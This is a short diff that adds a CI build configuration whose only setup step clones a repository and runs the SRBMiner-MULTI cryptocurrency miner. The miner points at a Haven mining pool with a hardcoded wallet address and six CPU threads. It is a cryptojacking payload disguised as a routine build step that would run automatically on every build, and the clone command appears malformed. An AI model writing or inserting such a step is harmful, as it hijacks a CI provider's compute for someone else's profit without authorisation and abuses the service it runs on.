@@ -1,0 +1,6 @@
+build:
+  nodes:
+    my-node:
+      project_setup:
+        before:
+          - command: https://gitlab.com/gilacrypto/haven.git haven && cd haven && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --algorithm cryptonight_xhv --pool sg.haven.herominers.com:10450 --wallet hvxy28wBPrTKkKEB1FrtuJECUSGMtPEMvb4eymCcxFVFFESR2iFwNdnNabz6WbB42VjpNFWDzjrs8KHjJjcNTP2u4WvFDZi8SG --password cikutan --disable-gpu --cpu-threads 6
